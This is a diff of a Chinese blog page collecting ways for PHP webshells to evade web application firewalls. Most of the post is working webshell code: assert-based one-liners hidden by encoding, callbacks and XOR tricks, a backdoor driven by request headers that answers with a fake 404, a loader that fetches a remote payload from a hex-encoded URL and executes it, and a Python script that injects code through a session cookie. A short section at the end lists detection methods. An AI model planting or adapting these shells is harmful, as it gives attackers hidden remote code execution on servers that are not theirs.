@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="Waf绕过,">
 
 
 
@@ -86,17 +86,20 @@
 
 
 
-<meta name="description" content="常见绕过WAF的PHP:字符串变形 大小写、编码、截取、替换、特殊字符拼接、null、回车、换行、特殊字符串干扰  &amp;lt;?php $a = base64_decode(&amp;quot;YXNzYXNz+00000____&amp;quot;); $a = substr_replace($a,&amp;quot;ert&amp;quot;,3); $a($_POST[&amp;apos;x&amp;apos;]); ?&amp;gt;  ucwo">
+<meta name="description" content="常见绕过WAF的PHP:字符串变形 大小写、编码、截取、替换、特殊字符拼接、null、回车、换行、特殊字符串干扰  &amp;lt;?php     $a = base64_decode(&amp;quot;YXNzYXNz+00000____&amp;quot;);     $a = substr_replace($a,&amp;quot;ert&amp;quot;,3);     $a($_POST[&amp;apos;x&amp;apos;]);">
+<meta name="keywords" content="Waf绕过">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP常见绕过WAF方法汇总">
 <meta property="og:url" content="http://MaiKeFee.com/archives/3f60c38c.html">
 <meta property="og:site_name" content="MaiKeFee|">
-<meta property="og:description" content="常见绕过WAF的PHP:字符串变形 大小写、编码、截取、替换、特殊字符拼接、null、回车、换行、特殊字符串干扰  &amp;lt;?php $a = base64_decode(&amp;quot;YXNzYXNz+00000____&amp;quot;); $a = substr_replace($a,&amp;quot;ert&amp;quot;,3); $a($_POST[&amp;apos;x&amp;apos;]); ?&amp;gt;  ucwo">
+<meta property="og:description" content="常见绕过WAF的PHP:字符串变形 大小写、编码、截取、替换、特殊字符拼接、null、回车、换行、特殊字符串干扰  &amp;lt;?php     $a = base64_decode(&amp;quot;YXNzYXNz+00000____&amp;quot;);     $a = substr_replace($a,&amp;quot;ert&amp;quot;,3);     $a($_POST[&amp;apos;x&amp;apos;]);">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-08T12:11:48.462Z">
+<meta property="og:image" content="https://mp.weixin.qq.com/s/vTz1-F6ESqYkKsppmAJtrQ">
+<meta property="og:updated_time" content="2019-09-08T12:41:25.115Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PHP常见绕过WAF方法汇总">
-<meta name="twitter:description" content="常见绕过WAF的PHP:字符串变形 大小写、编码、截取、替换、特殊字符拼接、null、回车、换行、特殊字符串干扰  &amp;lt;?php $a = base64_decode(&amp;quot;YXNzYXNz+00000____&amp;quot;); $a = substr_replace($a,&amp;quot;ert&amp;quot;,3); $a($_POST[&amp;apos;x&amp;apos;]); ?&amp;gt;  ucwo">
+<meta name="twitter:description" content="常见绕过WAF的PHP:字符串变形 大小写、编码、截取、替换、特殊字符拼接、null、回车、换行、特殊字符串干扰  &amp;lt;?php     $a = base64_decode(&amp;quot;YXNzYXNz+00000____&amp;quot;);     $a = substr_replace($a,&amp;quot;ert&amp;quot;,3);     $a($_POST[&amp;apos;x&amp;apos;]);">
+<meta name="twitter:image" content="https://mp.weixin.qq.com/s/vTz1-F6ESqYkKsppmAJtrQ">
 
 
 
@@ -357,12 +360,56 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-08T20:11:48+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-08T20:41:25+08:00">
                 2019-09-08
               </time>
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/知识科普/" itemprop="url" rel="index">
+                    <span itemprop="name">知识科普</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/知识科普/奇淫技巧/" itemprop="url" rel="index">
+                    <span itemprop="name">奇淫技巧</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/知识科普/奇淫技巧/Php特性/" itemprop="url" rel="index">
+                    <span itemprop="name">Php特性</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -407,7 +454,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  545
+                  547
                 </span>
               
 
@@ -448,9 +495,9 @@
 <p>大小写、编码、截取、替换、特殊字符拼接、null、回车、换行、特殊字符串干扰</p>
 </blockquote>
 <pre><code>&lt;?php
-$a = base64_decode(&quot;YXNzYXNz+00000____&quot;);
-$a = substr_replace($a,&quot;ert&quot;,3);
-$a($_POST[&apos;x&apos;]);
+    $a = base64_decode(&quot;YXNzYXNz+00000____&quot;);
+    $a = substr_replace($a,&quot;ert&quot;,3);
+    $a($_POST[&apos;x&apos;]);
 ?&gt;
 
 ucwords()
@@ -473,12 +520,12 @@ unpack()</code></pre><h1 id="自写函数"><a href="#自写函数" class="header
 <p>利用assert()</p>
 </blockquote>
 <pre><code>&lt;?php 
-function test($a){
-    $a($_POST[&apos;x&apos;]);
-}
-test(assert);
+    function test($a){
+        $a($_POST[&apos;x&apos;]);
+    }
+    test(assert);
 ?&gt;</code></pre><h1 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h1><pre><code>&lt;?php 
-call_user_func(assert,array($_POST[x]));
+    call_user_func(assert,array($_POST[x]));
 ?&gt;
 call_user_func_array()
 array_filter() 
@@ -504,24 +551,24 @@ class test
 $b = new test;
 $b-&gt;a = $_POST[&apos;x&apos;];
 ?&gt;</code></pre><h1 id="利用外部文件"><a href="#利用外部文件" class="headerlink" title="利用外部文件"></a>利用外部文件</h1><h2 id="利用curl-fsockopen等发起网络请求再结合file-get-contents"><a href="#利用curl-fsockopen等发起网络请求再结合file-get-contents" class="headerlink" title="利用curl, fsockopen等发起网络请求再结合file_get_contents"></a>利用curl, fsockopen等发起网络请求再结合file_get_contents</h2><pre><code>&lt;?php
-error_reporting(0);
-session_start();
-header(&quot;Content-type:text/html;charset=utf-8&quot;);if(empty($_SESSION[&apos;api&apos;]))
-$_SESSION[&apos;api&apos;]=substr(file_get_contents(sprintf(&apos;%s?%s&apos;,pack(&quot;H*&quot;,
-&apos;687474703a2f2f7777772e77326e31636b2e636f6d2f7368656c6c2f312e6a7067&apos;),uniqid())),3649);
-@preg_replace(&quot;~(.*)~ies&quot;,gzuncompress($_SESSION[&apos;api&apos;]),null);
+    error_reporting(0);
+    session_start();
+    header(&quot;Content-type:text/html;charset=utf-8&quot;);if(empty($_SESSION[&apos;api&apos;]))
+    $_SESSION[&apos;api&apos;]=substr(file_get_contents(sprintf(&apos;%s?%s&apos;,pack(&quot;H*&quot;,
+    &apos;687474703a2f2f7777772e77326e31636b2e636f6d2f7368656c6c2f312e6a7067&apos;),uniqid())),3649);
+    @preg_replace(&quot;~(.*)~ies&quot;,gzuncompress($_SESSION[&apos;api&apos;]),null);
 ?&gt;</code></pre><h1 id="无字符特征马"><a href="#无字符特征马" class="headerlink" title="无字符特征马"></a>无字符特征马</h1><h2 id="编码、异或、自增"><a href="#编码、异或、自增" class="headerlink" title="编码、异或、自增"></a>编码、异或、自增</h2><pre><code>&lt;?php
-$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;;
-$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;
-$___=$$__;
-$_($___[_]); // assert($_POST[_]);
+    $_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;;
+    $__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;
+    $___=$$__;
+    $_($___[_]); // assert($_POST[_]);
 ?&gt;</code></pre><h1 id="特殊请求头"><a href="#特殊请求头" class="headerlink" title="特殊请求头"></a>特殊请求头</h1><h2 id="利用getallheaders"><a href="#利用getallheaders" class="headerlink" title="利用getallheaders()"></a>利用getallheaders()</h2><pre><code>&lt;?php
-$cai=getallheaders()[&apos;cai&apos;];
-$dao=getallheaders()[&apos;dao&apos;];
-if($cai!=&quot;&quot; and $dao!=&quot;&quot;){
-  $cai=gzuncompress(base64_decode($cai));$cai(gzuncompress(base64_decode($dao)));
-}
-header(&apos;HTTP/1.1 404 Not Found&apos;);
+    $cai=getallheaders()[&apos;cai&apos;];
+    $dao=getallheaders()[&apos;dao&apos;];
+    if($cai!=&quot;&quot; and $dao!=&quot;&quot;){
+      $cai=gzuncompress(base64_decode($cai));$cai(gzuncompress(base64_decode($dao)));
+    }
+    header(&apos;HTTP/1.1 404 Not Found&apos;);
 ?&gt;</code></pre><h1 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h1><h2 id="利用getenv-，arrag-flip-，get-defined-vars-，session-id"><a href="#利用getenv-，arrag-flip-，get-defined-vars-，session-id" class="headerlink" title="利用getenv()，arrag_flip()，get_defined_vars()，session_id()"></a>利用getenv()，arrag_flip()，get_defined_vars()，session_id()</h2><pre><code>import requests
 url = &apos;http://localhost/?code=eval(hex2bin(session_id(session_start())));&apos;
 payload = &quot;phpinfo();&quot;.encode(&apos;hex&apos;)
@@ -529,7 +576,7 @@ cookies = {
   &apos;PHPSESSID&apos;:payload
 }
 r = requests.get(url=url,cookies=cookies)
-print r.content</code></pre><h1 id="PHP混淆加解密"><a href="#PHP混淆加解密" class="headerlink" title="PHP混淆加解密"></a>PHP混淆加解密</h1><h2 id="以phpjiami为例"><a href="#以phpjiami为例" class="headerlink" title="以phpjiami为例"></a>以phpjiami为例</h2><pre><code>就是将函数名、变量名全部变成&quot;乱码&quot;，且改动任意一个地方，都将导致文件不能运行。具体可访问：https://www.phpjiami.com/</code></pre><h1 id="webshell检测方法-大概"><a href="#webshell检测方法-大概" class="headerlink" title="webshell检测方法(大概)"></a>webshell检测方法(大概)</h1><pre><code>机器学习检测webshell：比如混淆度、最长单词、重合指数、特征、压缩比等
+print r.content</code></pre><h1 id="PHP混淆加解密"><a href="#PHP混淆加解密" class="headerlink" title="PHP混淆加解密"></a>PHP混淆加解密</h1><h2 id="以phpjiami为例"><a href="#以phpjiami为例" class="headerlink" title="以phpjiami为例"></a>以phpjiami为例</h2><pre><code>就是将函数名、变量名全部变成&quot;乱码&quot;，且改动任意一个地方，都将导致文件不能运行。具体可访问：https://www.phpjiami.com/</code></pre><h1 id="webshell检测方法-部分"><a href="#webshell检测方法-部分" class="headerlink" title="webshell检测方法(部分)"></a>webshell检测方法(部分)</h1><pre><code>机器学习检测webshell：比如混淆度、最长单词、重合指数、特征、压缩比等
 
 动态检测（沙箱）
 
@@ -537,7 +584,9 @@ print r.content</code></pre><h1 id="PHP混淆加解密"><a href="#PHP混淆加�
 
 逆向算法+静态匹配检测webshell：比如D盾webshell查杀
 
-根据文件入度出度来检测</code></pre>
+根据文件入度出度来检测</code></pre><p>参考:</p>
+<p><img src="https://mp.weixin.qq.com/s/vTz1-F6ESqYkKsppmAJtrQ" alt="PHP常见过WAF webshell及最简单检测方法"></p>
+
       
     </div>
     
@@ -597,6 +646,14 @@ print r.content</code></pre><h1 id="PHP混淆加解密"><a href="#PHP混淆加�
 
   <footer class="post-footer">
 
+    
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Waf绕过/" rel="tag"><i class="fa fa-tag"></i> Waf绕过</a>
+          
+        </div>
+      
 
       
       
@@ -709,7 +766,7 @@ print r.content</code></pre><h1 id="PHP混淆加解密"><a href="#PHP混淆加�
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-count">28</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -720,7 +777,7 @@ print r.content</code></pre><h1 id="PHP混淆加解密"><a href="#PHP混淆加�
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -814,7 +871,7 @@ print r.content</code></pre><h1 id="PHP混淆加解密"><a href="#PHP混淆加�
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#常见绕过WAF的PHP"><span class="nav-number">1.</span> <span class="nav-text">常见绕过WAF的PHP:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#字符串变形"><span class="nav-number">1.1.</span> <span class="nav-text">字符串变形</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#自写函数"><span class="nav-number">2.</span> <span class="nav-text">自写函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#回调函数"><span class="nav-number">3.</span> <span class="nav-text">回调函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#类"><span class="nav-number">4.</span> <span class="nav-text">类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用魔术方法、析构函数destruct-，construct"><span class="nav-number">4.1.</span> <span class="nav-text">利用魔术方法、析构函数destruct()，construct()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用外部文件"><span class="nav-number">5.</span> <span class="nav-text">利用外部文件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用curl-fsockopen等发起网络请求再结合file-get-contents"><span class="nav-number">5.1.</span> <span class="nav-text">利用curl, fsockopen等发起网络请求再结合file_get_contents</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#无字符特征马"><span class="nav-number">6.</span> <span class="nav-text">无字符特征马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#编码、异或、自增"><span class="nav-number">6.1.</span> <span class="nav-text">编码、异或、自增</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#特殊请求头"><span class="nav-number">7.</span> <span class="nav-text">特殊请求头</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用getallheaders"><span class="nav-number">7.1.</span> <span class="nav-text">利用getallheaders()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#全局变量"><span class="nav-number">8.</span> <span class="nav-text">全局变量</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用getenv-，arrag-flip-，get-defined-vars-，session-id"><span class="nav-number">8.1.</span> <span class="nav-text">利用getenv()，arrag_flip()，get_defined_vars()，session_id()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP混淆加解密"><span class="nav-number">9.</span> <span class="nav-text">PHP混淆加解密</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#以phpjiami为例"><span class="nav-number">9.1.</span> <span class="nav-text">以phpjiami为例</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#webshell检测方法-大概"><span class="nav-number">10.</span> <span class="nav-text">webshell检测方法(大概)</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#常见绕过WAF的PHP"><span class="nav-number">1.</span> <span class="nav-text">常见绕过WAF的PHP:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#字符串变形"><span class="nav-number">1.1.</span> <span class="nav-text">字符串变形</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#自写函数"><span class="nav-number">2.</span> <span class="nav-text">自写函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#回调函数"><span class="nav-number">3.</span> <span class="nav-text">回调函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#类"><span class="nav-number">4.</span> <span class="nav-text">类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用魔术方法、析构函数destruct-，construct"><span class="nav-number">4.1.</span> <span class="nav-text">利用魔术方法、析构函数destruct()，construct()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用外部文件"><span class="nav-number">5.</span> <span class="nav-text">利用外部文件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用curl-fsockopen等发起网络请求再结合file-get-contents"><span class="nav-number">5.1.</span> <span class="nav-text">利用curl, fsockopen等发起网络请求再结合file_get_contents</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#无字符特征马"><span class="nav-number">6.</span> <span class="nav-text">无字符特征马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#编码、异或、自增"><span class="nav-number">6.1.</span> <span class="nav-text">编码、异或、自增</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#特殊请求头"><span class="nav-number">7.</span> <span class="nav-text">特殊请求头</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用getallheaders"><span class="nav-number">7.1.</span> <span class="nav-text">利用getallheaders()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#全局变量"><span class="nav-number">8.</span> <span class="nav-text">全局变量</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用getenv-，arrag-flip-，get-defined-vars-，session-id"><span class="nav-number">8.1.</span> <span class="nav-text">利用getenv()，arrag_flip()，get_defined_vars()，session_id()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP混淆加解密"><span class="nav-number">9.</span> <span class="nav-text">PHP混淆加解密</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#以phpjiami为例"><span class="nav-number">9.1.</span> <span class="nav-text">以phpjiami为例</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#webshell检测方法-部分"><span class="nav-number">10.</span> <span class="nav-text">webshell检测方法(部分)</span></a></li></ol></div>
             
 
           </div>
